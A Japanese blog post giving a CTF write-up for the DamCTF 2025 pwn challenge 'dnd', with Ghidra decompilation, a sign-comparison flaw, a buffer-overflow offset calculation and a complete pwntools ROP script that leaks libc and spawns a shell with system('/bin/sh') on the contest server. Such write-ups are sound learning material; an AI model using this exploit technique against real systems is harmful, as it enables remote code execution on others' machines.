+++
date = 2025-05-17
title = "DamCTF 2025 Writeup"
[taxonomies]
tags = ["CTF"]
+++

## これは何
DamCTF 2025のwriteup(1問のみ)です。writeupとは。  
気づいたら2ヶ月近く何も更新していませんね。CTFをやればwriteupを書きたくなるのでこれは実質何もしていなかったことをバラしているようなものです。  
実は他にも参加はしたんですが1問も解けず、結局何も書けないということもありました。  

---

## dnd
ソースコードが配れられいないのでGhidraで解析してみる  
no pie で no canary なのでろぷ?って感じ  
`win`関数があり、32bytesに対して`fgets(local_68,0x100,stdin);`なので自明なBOFが存在する  
`win`にはたどり着けることも有るしたどり着けないこともある。何か抜け道は無いだろうか  


roundのための無限whileがあり、モンスターは`rand()%3`で計算されているのでどのモンスターが出るかはちょっと分からない。ゲーム終了(無限while終了)の処理と、その後の win or lose 処理が存在  

何やらソースコード全体で使われている変数があったので、その初期値設定を見てみる。
```c++
void __thiscall Game::Game(Game *this)

{
  *this = (Game)0x0;
  this[1] = (Game)0xa;
  this[2] = (Game)0x5;
  return;
}
```

```c++
// 無限while終了
if ((round < 5) && (cVar1 = Game::IsOver(important ?), cVar1 != '\x01')) {
  isOver = true;
}
else {
  isOver = false;
}
```

```c++
undefined8 Game::IsOver(char *param_1)

{
  undefined8 uVar1;

  // while終了のためにはこちらが必要
  if ((*param_1 < 100) && (0 < param_1[1])) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

重要そうな変数は下記と初期値が一致していた。便宜上`player_status`と名付ける。
```
Points: 0 | Health: 10 | Attack: 5
```

`player_status`の増減を追いたいのでAttackを見てみる  
`*this`はモンスターの体力と思われ、`param_1[2]`はプレイヤーの攻撃力であり、体力<攻撃力ならモンスターを撃破できる  
その際
- `*param_1`ことポイントがモンスターの体力+プレイヤーのポイントになる
- `param_1[2]`こと攻撃力がインクリメントされる
反対に負けると
- 体力 = 体力 - モンスターの攻撃力
- ポイント = ポイント - モンスターの体力
```c++
void __thiscall Monster::Attack(Monster *this,Game * param_1)

{
  basic_ostream *pbVar1;

  // *thisはモンスターの体力と推察できる
  // param_1[2]はプレイヤーのAttackなので 体力 < 攻撃力 ならモンスターを倒せる
  if ((char)*this < (char)param_1[2]) {
    pbVar1 = std::operator<<((basic_ostream *)std::co ut,"You defeated the monster!");
    std::basic_ostream<>::operator<<((basic_ostream <> *)pbVar1,std::endl<>);
    *param_1 = (Game)((char)*this + (char)*param_1);
    param_1[2] = (Game)((char)param_1[2] + '\x01');
  }
  else {
    pbVar1 = std::operator<<((basic_ostream *)std::co ut,"Oof, that hurt ;(");
    std::basic_ostream<>::operator<<((basic_ostream <> *)pbVar1,std::endl<>);
    param_1[1] = (Game)((char)param_1[1] - (char)this [1]);
    *param_1 = (Game)((char)*param_1 - (char)*this);
  }
  return;
}
```

負けた場合
- Pointsが-9
- Healthも-9
```
>>> Round 1
Points: 0 | Health: 10 | Attack: 5
New enemy! You are now facing off against: Tyrannus the Dragon (9 health, 9 damage)
Do you want to [a]ttack or [r]un? 
Oof, that hurt ;(

>>> Round 2
Points: -9 | Health: 1 | Attack: 5
New enemy! You are now facing off against: Glitchkin the Gremlin (1 health, 2 damage)
Do you want to [a]ttack or [r]un? 
You defeated the monster!
```

勝った場合
- Pointsが+2
- Attack++
```
>>> Round 1
Points: 0 | Health: 10 | Attack: 5
New enemy! You are now facing off against: Glitchkin the Gremlin (2 health, 1 damage)
Do you want to [a]ttack or [r]un? a
You defeated the monster!

>>> Round 2
Points: 2 | Health: 10 | Attack: 6
New enemy! You are now facing off against: Glitchkin the Gremlin (1 health, 1 damage)
Do you want to [a]ttack or [r]un? a
You defeated the monster!
```

増減がどうなるか分かったのでもう一度while終了処理を見てみる  
どうやら roundが0-4のうちにポイントが100未満かつ体力が1以上である必要があるらしい  
とりあえず無限whileから抜け出すにはround5までに生き残れば良いらしい  
```c++
while( true ) {
if ((round < 5) && (cVar1 = Game::IsOver(player_status), cVar1 != '\x01')) {
  game_continue = true;
}
else {
  game_continue = false;
}
if (!game_continue) break;
```

```c++
undefined8 Game::IsOver(char *param_1)

{
  undefined8 uVar1;

  // while終了のためにはこちらが必要
  if ((*param_1 < 100) && (0 < param_1[1])) {
    uVar1 = 0;
  }
  else {
    uVar1 = 1;
  }
  return uVar1;
}
```

そしたら`DidWin()`関数による勝敗の処理を見てみる。pointsが100以上なら勝ちらしいが意味が分からない。  
`*param_1`が符号なしで比較されるとしたらPointsが負数になると良いかもしれない -> 負けてPointsをマイナスになるようにしてみると Healthが0以下になるかroundが5回終了するたびに`win`が実行された。  
何故Pointsが負数になると比較処理で100以上と判定されるのかは未だに謎(おそらくunsignedなcharに負数を与えてifで比較するとcharがintに拡張されて正数になるから?)  
```c++
cVar1 = Game::DidWin(player_status);
if (cVar1 == '\0') {
lose();
}
else {
win();
}
```

```c++
bool Game::DidWin(byte *param_1)

{
  return 99 < *param_1;
}
```

なんやかんやで`win`の`fgets`まで行くスクリプトが書けたので、後はoffset等を求めていく。win関数のfgets終了直後の状態は以下の通り。  
`0x41414141...`が入力したAの羅列である。`0x0000000000402c79`がmainへのretaddrなので、offsetは`8*13 = 104bytes`となる。  
```
0x7fffffffe0c0: 0x4141414141414141      0x00007fffffff000a
0x7fffffffe0d0: 0x00007fffffffe100      0x00007fffffffe150
0x7fffffffe0e0: 0x00007fffffffe120      0x0000000000403820
0x7fffffffe0f0: 0x0000000000000001      0x00007fffffffe150
0x7fffffffe100: 0x00007fffffffe120      0x00007fffffffe150
0x7fffffffe110: 0x00007fffffffe15d      0x0000000000000001
0x7fffffffe120: 0x00007fffffffe190      0x0000000000402c79
```

libcリークしたいのでputsを使ってputsのアドレスをリークしたい。  
`dnd_pathced`の中には`pop rdi; ret`が無いため関数呼び出しができないことに気づく。libcを使いたいが、そのベースアドレスを求めるためにROPしているのであって本末転倒である。  

下記よりret2csuは使えない(glibc2.34以上が使えない)
```
[figaro@figaro-endeavour dnd]$ strings libc.so.6 | grep version
...
GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.4) stable release version 2.39.
...
```

pwntoolsは認識しないが、ROPgadgetしたら`pop rdi; nop; pop rbp; ret`を見つけたのでこれを使ってみる。  
win関数の一回目で`puts(puts@got)`を行ってlibc baseをリークし、そのまま二回目のwin関数を実行させる。二回目のwin関数で`system("/bin/sh")`を行って終了。  
```python
from pwn import *

bin = './dnd_patched'
elf = context.binary = ELF(bin)
libc = ELF('./libc.so.6')

#p = process(bin)
p = remote('dnd.chals.damctf.xyz', 30813)
cnt = 1

while cnt <= 5:
    p.recvuntil(b'Health: ')
    current_health = int(p.recvuntil(' '), 10)

    p.recvuntil(b'Attack: ')
    current_attack = int(p.recvuntil('\n'), 10)

    p.recvuntil(b'(')
    monster_health = int(p.recvuntil(' ', 10))

    p.recvuntil(b', ')
    monster_damage = int(p.recvuntil(' ', 10))

    print(f'current_health: {current_health}')
    print(f'current_attack: {current_attack}')
    print(f'monster_health: {monster_health}')
    print(f'monster_damage: {monster_damage}')


    p.recvuntil(b'[r]un? ')
    if (current_attack <= monster_health):
        print('send attack')
        p.sendline(b'a')
    else:
        print('send run')
        p.sendline(b'r')

    p.recvline()
    if 'Congratulations' in f'{p.recvline()}':
        break

    cnt+=1


POP_RDI_NOP_POP_RBP_RET = 0x0000000000402640
RET = 0x000000000040201a

# send ROP payload to execute puts(puts@got) to leak address of puts
# and execute win function again to send next payload
rop = ROP(elf)
rop.raw(b'A'*104)
rop.raw(POP_RDI_NOP_POP_RBP_RET)
rop.raw(elf.got['puts'])
rop.raw(0x0)
rop.raw(elf.plt['puts'])
rop.raw(elf.sym['_Z3winv'])
print(rop.dump())
payload = rop.chain()
p.sendline(payload)

# calculate libc base
p.recvline()
puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
print(hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
print(hex(libc.address))

# send system("/bin/sh")
p.recvuntil(b'warrior? ')
rop = ROP(libc)
rop.raw(b'A'*104)
rop.raw(RET)
rop.raw(POP_RDI_NOP_POP_RBP_RET)
rop.raw(next(libc.search(b'/bin/sh')))
rop.raw(0x0)
rop.raw(libc.sym['system'])
print(rop.dump())
payload = rop.chain()

p.sendline(payload)

p.interactive()
```

フラグ
`dam{w0w_th0s3_sc4ry_m0nster5_are_w3ak}`

---

## 終わりに
他は解いていないんですか!? -> はい
